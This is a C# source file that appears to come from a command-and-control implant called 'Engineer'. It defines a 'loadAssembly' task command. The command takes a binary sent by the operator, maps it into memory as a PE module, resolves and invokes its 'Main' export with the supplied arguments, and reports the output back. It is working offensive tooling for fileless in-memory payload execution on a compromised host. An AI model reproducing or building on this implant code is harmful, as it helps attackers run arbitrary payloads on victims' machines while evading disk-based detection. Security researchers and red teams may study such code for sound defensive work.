using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;
using System.IO;
using static Engineer.Extra.WinApiDynamicDelegate;
using Engineer.Functions;

namespace Engineer.Commands
{
    internal class LoadAssembly : EngineerCommand
    {
        public override string Name => "loadAssembly";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                task.Arguments.TryGetValue("/args", out string args);
                args = args.TrimStart(' ');
                args = args.TrimStart('\"');
                args = args.TrimEnd('\"');

                var bytesToload = task.File;
                var mappedModule = reprobate.MapModuleToMemory(bytesToload);

                object[] parameters = new object[] { args.Split(' ') };

                IntPtr address =  reprobate.GetExportAddress(mappedModule.ModuleBase, "Main");

                string output = ((string)reprobate.DynamicFunctionInvoke(address, typeof(GenericDelegate),ref parameters));
                Tasking.FillTaskResults(output, task, EngTaskStatus.Complete,TaskResponseType.String);
                // reprobate.CallMappedPEModule(mappedModule.PEINFO, mappedModule.ModuleBase);

            }
            catch(Exception ex)
            {
                Tasking.FillTaskResults("error: " +ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
                
            }
        }
    }
}
